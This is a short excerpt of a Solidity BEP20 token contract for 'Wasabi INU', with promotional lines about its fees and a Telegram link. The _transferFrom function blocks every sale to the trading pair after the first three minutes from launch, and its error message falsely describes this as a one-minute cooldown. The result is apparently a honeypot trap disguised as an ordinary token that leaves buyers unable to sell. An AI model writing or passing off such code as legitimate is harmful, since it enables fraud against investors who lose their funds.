...
Wasabi Inu
Can you handle the hotness of Wasabi?
6 buy/sell (3%liq 3%marketing) 

https://t.me/wasabiinu
...
contract Wasabi is IBEP20, Auth {
    ...
    string constant _name = "Wasabi INU";
    string constant _symbol = "WASABI";
    ...
    address public marketingFeeReceiver = 0xf878740343b57f8E4F3572ecFfeB3a03654b8bed;
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if (recipient == pair && !isTimelockExempt[sender]) {
                require(block.timestamp <= (launchTime + 3 minutes),"Please wait for 1min between two operations");
                }
